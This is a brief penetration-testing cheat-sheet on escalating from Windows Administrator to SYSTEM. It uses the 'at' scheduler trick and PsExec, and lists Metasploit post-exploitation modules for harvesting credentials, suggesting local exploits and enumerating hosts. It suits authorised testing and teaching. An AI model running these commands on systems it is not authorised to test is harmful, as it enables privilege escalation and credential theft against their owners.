# Escalate to System from Admin

## On Windows XP and Older

* ff you have a GUI with a user that is included in Administrators group you first need to open up cmd.exe for the administrator
* if you open up the cmd that is in Accessories it will be opened up as a normal user
* if you rightclick and do Run as Administrator you might need to know the Administrators password, which you might not know
* instead you open up the cmd from c:\windows\system32\cmd.exe, this will give you a cmd with Administrators rights.
* from here we want to become SYSTEM user. To do this we run a command to check the local machine time

```bash
time
```

* now set the time we want the system CMD to start, probably one minuter after the time

```bash
at 01:23 /interactive cmd.exe
```

* and then the cmd with SYSTEM privs pops up.

## Vista and Newer

* first need to upload PsExec.exe and then you run

```bash
psexec -i -s cmd.exe
```

## Post Modules

* some interesting metasploit post-modules
* first you need to background the meterpreter shell and then you just run the post modules.

```bash
use exploit/windows/local/service_permissions
post/windows/gather/credentials/gpp
run post/windows/gather/credential_collector
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_shares
run post/windows/gather/enum_snmp
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/checkvm
```

